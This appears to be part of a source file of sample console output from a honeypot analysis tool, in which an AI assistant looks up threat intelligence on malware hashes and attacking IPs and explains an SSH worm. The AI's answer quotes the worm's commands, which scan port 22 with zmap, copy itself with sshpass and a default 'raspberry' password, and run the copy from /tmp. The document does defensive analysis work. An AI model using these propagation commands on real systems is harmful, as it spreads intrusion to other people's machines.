Submitting tool output: {'10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c': {'malwarebazaar': {'first_seen': '2022-07-16 05:08:48', 'file_name': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'file_size': 4766, 'file_type_mime': 'application/octet-stream', 'file_type': 'sh', 'delivery_method': 'other', 'intelligence': {'clamav_signatures': ['SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL'], 'times_downloaded_from_malwarebazaar': '83', 'times_uploaded_to_malwarebazaar': '1'}, 'vendor_intel': {'YOROI_YOMI': {'detection': 'Legit File', 'score': '0.00'}, 'InQuest': {'verdict': 'MALICIOUS'}, 'ReversingLabs': {'threat_name': 'Linux.Trojan.Generic', 'status': 'SUSPICIOUS', 'first_seen': '2021-05-12 07:07:18', 'scanner_count': '42', 'scanner_match': '27', 'scanner_percent': '64.29'}, 'Spamhaus_HBL': [{'detection': 'suspicious'}]}}, 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Using saved threatfox data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus
ERROR: Error caught while getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus: Invalid arg_type: hash

Submitting tool output: {'1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Using saved threatfox data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus
ERROR: Error caught while getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus: Invalid arg_type: hash

Submitting tool output: {'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Run run_viIztnmV7bEgeUEXfe28vZqi completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_viIztnmV7bEgeUEXfe28vZqi

 Done with: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
Answer: Based on the data obtained from MalwareBazaar, ThreatFox, URLhaus, and Malpedia, here is what is known about the malware and potential exploits involved in the attack:

### Malware Hash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
- **First Seen:** July 16, 2022, on MalwareBazaar.
- **File Name:** Not specifically named, hash used as reference.
- **File Size:** 4766 bytes.
- **File Type MIME:** application/octet-stream.
- **File Type:** Potentially a shell script (.sh).
- **Delivery Method:** Other (not specified).
- **ClamAV Signature:** Detected as SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL.
- **Times Downloaded from MalwareBazaar:** 83 times.
- **Times Uploaded to MalwareBazaar:** 1 time.
- **ReversingLabs:** Identified as a suspicious Linux trojan with the name "Linux.Trojan.Generic".
  - First seen by ReversingLabs: May 12, 2021.
  - Matched by 27 out of 42 scanners (64.29% detection rate).
- **Spamhaus HBL:** Detected as suspicious.
- **InQuest:** Verdict rendered as malicious.
- **No Data in ThreatFox and URLhaus:** The hash doesn't appear to have entries in these two databases.

### Malware Hashes: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 and b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
- No data available from MalwareBazaar, ThreatFox, or URLhaus.

### Analysis:
- **Relevant Hosts:** No specific URLs or hosts were found associated with the malware samples.
- **Known Source IPs:** The malware was downloaded by the following IPs:
  - Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c by 93.223.169.159.
  - Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 by 27.93.25.111.
  - Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by 111.216.194.148.

The attackers appear to have utilized a known Linux trojan, potentially a shell script, as part of their attack. This malware has signatures that are detected by various antivirus and security tools, indicating its malicious nature. The lack of additional information about the other two hashes suggests that they might be less known or more recently developed samples. No specific exploits were extracted from these datasets, but the indicators suggest the use of trojanized Linux utilities or scripts as part of the attacker's toolkit.

...Truncated...
Done analyzing/postprocessing 1 attacks.
Writing markdown report for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Finished writing markdown report and for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Finished writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Finished exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Honeypot AI Finished Successfully!    
    """,



    "chat_mode": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --chat
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10a324dd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10a6a9990>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['98.159.37.5', '216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0046s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant

Entering honeypot-ai Chat Mode...
################################
#                              #
# honeypot-ai Interactive Chat #
#                              #
################################
Ask the AI questions about: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 

Choices:
 (1) Ask a question
 (2) Ask a multiline question from file
 (3) Change OpenAI model. (Current model: gpt-4-1106-preview)
 (4) Print attack attributes
 (q) Quit and continue main

Enter choice (1,2,3,4 OR q): 1
Enter question: Are the source IPs associated with any other malware samples?
Enter question key or leave empty to use 'question_1' : 

Your Questions:
{'question_1': 'Are the source IPs associated with any other malware samples?'}

Choices:
 (1) Send/Ask questions
 (2) Add another question
 (3) Clear questions

Enter choice (1,2,3): 1


Asking: Are the source IPs associated with any other malware samples?
Updated asst_R5O9vhLKONwNlqmmxbMYugLo: model, instructions
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ

AI called tool: query_ip_data
with args: {'ips': ['93.223.169.159'], 'sources': ['cybergordon']}
Using saved cybergordon data ip for 93.223.169.159

Submitting tool output: {'93.223.169.159': {'cybergordon': {'[E34] IPdata.co': 'Geo: Frankfurt am Main, Hessen, Germany. Network: AS3320, Deutsche Telekom Ag, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Charles Haley, DataPlane.org, James Brine, Scriptz Team. ', '[E11] DShield/ISC': 'Found in 11 report(s) listing 2 target(s), last on 5 Feb 2024 ', '[E2] AbuseIPDB': 'Hostname(s): p5ddfa99f.dip0.t-ipconnect.de. ISP: Deutsche Telekom AG. Usage: None. Risk 100%. 502 report(s) by 216 user(s), last on 06 February 2024  ', '[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E33] GreyNoise': 'Last report on 06 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E24] BlackList DE': 'Found in 28 attack(s) and 22 report(s) ', '[E17] Pulsedive': 'Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. ', '[E12] AlienVault OTX': 'Found in 6 pulse-feed(s) '}}}

AI called tool: query_ip_data
with args: {'ips': ['27.93.25.111'], 'sources': ['cybergordon']}
Using saved cybergordon data ip for 27.93.25.111

Submitting tool output: {'27.93.25.111': {'cybergordon': {'[E33] GreyNoise': 'Last report on 06 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E34] IPdata.co': 'Geo: Hiroshima, Hirosima (Hiroshima), Japan. Network: AS2516, KDDI Corporation, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine. ', '[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E11] DShield/ISC': 'Found in 17 report(s) listing 4 target(s), last on 4 Feb 2024 ', '[E24] BlackList DE': 'Found in 64 attack(s) and 29 report(s) ', '[E2] AbuseIPDB': 'Hostname(s): KD027093025111.ppp-bb.dion.ne.jp. ISP: KDDI Corporation. Usage: None. Risk 100%. 1053 report(s) by 376 user(s), last on 06 February 2024  ', '[E17] Pulsedive': 'Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): HTTP, SSH. ', '[E12] AlienVault OTX': 'Found in 16 pulse-feed(s) ', '[E23] Offline Feeds': 'Found in Duggy Tuxy - EU Botnets/Zombies/Scanners '}}}

AI called tool: query_ip_data
with args: {'ips': ['111.216.194.148'], 'sources': ['cybergordon']}
Using saved cybergordon data ip for 111.216.194.148

Submitting tool output: {'111.216.194.148': {'cybergordon': {'[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E34] IPdata.co': 'Geo: Yokohama, Kanagawa, Japan. Network: AS2527, Sony Network Communications Inc, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, DataPlane.org, James Brine. ', '[E2] AbuseIPDB': 'Hostname(s): fp6fd8c294.ap.nuro.jp. ISP: Sony Network Communications Inc.. Usage: None. Risk 100%. 460 report(s) by 210 user(s), last on 06 February 2024  ', '[E11] DShield/ISC': 'Found in 11 report(s) listing 4 target(s), last on 5 Feb 2024 ', '[E24] BlackList DE': 'Found in 28 attack(s) and 17 report(s) ', '[E33] GreyNoise': 'Last report on 05 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E17] Pulsedive': 'Risk: low. Last seen on 2 Feb 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts. Opened service(s): HTTPS, NETBIOS, RDP, SSH. ', '[E23] Offline Feeds': 'Found in Duggy Tuxy - EU Botnets/Zombies/Scanners ', '[E12] AlienVault OTX': 'Found in 7 pulse-feed(s) '}}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_0yLB9uPXjQw0iwXhItk06lMJ
Run run_0yLB9uPXjQw0iwXhItk06lMJ completed
Done asst_R5O9vhLKONwNlqmmxbMYugLo, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_0yLB9uPXjQw0iwXhItk06lMJ

 Done with: Are the source IPs associated with any other malware samples?
Answer: The CyberGordon data does not explicitly link the source IPs to any other specific malware samples by naming them. However, these IPs have been associated with several indicators of malicious activities, including:

### IP: 93.223.169.159
- Identified as a point of origin for malicious/attacker activity and abuse/bot activity.
- Listed on multiple blocklists, including those by Charles Haley, DataPlane.org, James Brine, and Scriptz Team.
- Found in 28 attacks and has 22 reports on BlackList DE.
- Recognized for SSH brute force activity on Pulsedive.
- Recorded in 502 reports by 216 users on AbuseIPDB.

### IP: 27.93.25.111
- Reported in 64 attacks and has 29 reports on BlackList DE.
- Categorized as part of EU Botnets/Zombies/Scanners in offline feeds.
- High-risk status on webroot.com and blocklists such as Anti-attacks.com and Charles Haley.
- Recorded in 1053 reports by 376 users on AbuseIPDB.

### IP: 111.216.194.148
- Found in 28 attacks and has 17 reports on BlackList DE.
- Part of EU Botnets/Zombies/Scanners as mentioned in offline feeds.
- High-risk status on webroot.com and listed on blocklists such as Anti-attacks.com and James Brine.
- Recorded in 460 reports by 210 users on AbuseIPDB.

While there is no direct evidence linking these IPs to other specific malware samples, their widespread association with malicious activity and various security incidents suggests they are part of broader attack campaigns and could be part of the infrastructure used to launch attacks and manage malware operations. It is not uncommon for such IPs to be multipurposed across different types of malware and various attack strategies.
################################
#                              #
# honeypot-ai Interactive Chat #
#                              #
################################
Ask the AI questions about: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 

Choices:
 (1) Ask a question
 (2) Ask a multiline question from file
 (3) Change OpenAI model. (Current model: gpt-4-1106-preview)
 (4) Print attack attributes
 (q) Quit and continue main

Enter choice (1,2,3,4 OR q): 1
Enter question: what is zmap used for in the malware?
Enter question key or leave empty to use 'question_2' : 

Your Questions:
{'question_2': 'what is zmap used for in the malware?'}

Choices:
 (1) Send/Ask questions
 (2) Add another question
 (3) Clear questions

Enter choice (1,2,3): 1


Asking: what is zmap used for in the malware?
Updated asst_R5O9vhLKONwNlqmmxbMYugLo: model, instructions
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_ma5kmSMBQKEhpCXtOk3ZlSu8
Run run_ma5kmSMBQKEhpCXtOk3ZlSu8 completed
Done asst_R5O9vhLKONwNlqmmxbMYugLo, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_ma5kmSMBQKEhpCXtOk3ZlSu8

 Done with: what is zmap used for in the malware?
Answer: In the malware, `zmap` is used as a fast network scanning tool specifically to identify and catalog hosts on the internet that have port 22 open, which is typically used for SSH (Secure Shell) services. The snippets of code in the malware that pertain to `zmap` use indicate the following actions:

1. Scans port 22 at a vast scale to find potential SSH servers: `zmap -p 22 (...)`

2. Outputs the results to a file: `zmap -p 22 -o $FILE -n 100000`

3. Uses the list of IPs found to attempt to replicate itself onto these new targets using `sshpass` to provide the password non-interactively and `scp` to copy the malware file: `sshpass -praspberry scp (...) && sshpass -praspberry ssh (...)`

4. Executes the malware on any newly compromised machines in hopes of further propagating the infection: `cd /tmp && chmod +x $NAME && bash -c ./$NAME`

The use of `zmap` in the malware is indicative of the attacker's intent to conduct a widespread search for vulnerable systems that can be compromised through SSH brute force attacks. By scanning for open SSH ports, the malware creator is aiming for lateral movement across the internet to spread the infection to as many devices as possible, potentially enlarging a botnet or creating a large pool of compromised systems for various malicious purposes.
################################
#                              #
# honeypot-ai Interactive Chat #
#                              #
################################
Ask the AI questions about: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 

Choices:
 (1) Ask a question
 (2) Ask a multiline question from file
 (3) Change OpenAI model. (Current model: gpt-4-1106-preview)
 (4) Print attack attributes
 (q) Quit and continue main

Enter choice (1,2,3,4 OR q): q
Finished chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant
Writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_2run-steps.md
Finished writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_2run-steps.md
Honeypot AI Finished Successfully!
""",



    "interactive": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --interact
Starting honeypot-ai...
Entering interactive mode (python shell)...

1 attacks are loaded into the 'ATTACKS' dict and 'ATTACKS_LIST' variables)
Attack attributes can be accessed via 'ATTACKS[ATTACK_ID].ATTR_NAME' or 'ATTACKS_LIST[ATTACK_INDEX].ATTR_NAME'Use dir(ATTACKS_LIST[0]) to see available Attack attr names and functions.
Use 'exit()' or type CTRL-D to exit interactive mode
>>> attack0 = ATTACKS_LIST[0]
>>> attack0
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
>>> attack0.split_commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj']
>>> attack0.sessions[0]
Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s
>>> attack0.sessions[0].start_time
datetime.datetime(2024, 1, 26, 21, 59, 42, 976396)
>>> attack0.commands.append("some modification")
>>> attack0.commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj', 'some modification']
>>> ^D
Exiting interactive mode and continuing honeypot-ai...
Honeypot AI Finished Successfully!
    """,



    "config_update": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --config config.json --update-config --openai-model gpt-4-1106-preview
Starting honeypot-ai...

Updated config file at config.json
No attack loading method specified. Use (-lfl/--load-from-logs) OR (-lfa/--load-from-attacks-dir)    
    """,


}
